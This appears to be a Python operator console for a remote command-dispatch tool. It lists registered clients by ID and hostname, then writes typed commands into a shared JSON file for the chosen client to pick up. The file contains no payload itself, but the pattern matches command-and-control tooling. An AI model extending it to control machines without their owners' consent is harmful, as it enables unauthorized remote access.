# console.py
import json
import settings

def newConsole():
    print("ID\t\tHostname")
    print("____\t\t________________")
    with open('./manage.json') as f:
        manage = json.load(f)
        for x in manage["clients"]:
            print(x + "\t\t" + manage["clients"][x]["hostname"])
    ID = input("What ID are we working with here : ")
    while ID not in manage["clients"]:
        ID = input("Not a valid key, try again : ")
        with open('./manage.json') as f:
            manage = json.load(f)
    command = input("Input: ")

    while True:
        with settings.lock:
            with open('./manage.json') as f:
                manage = json.load(f)

            manage["clients"][ID]["command"] = command

            with open('./manage.json', 'w') as f:
                json.dump(manage, f)

        command = input()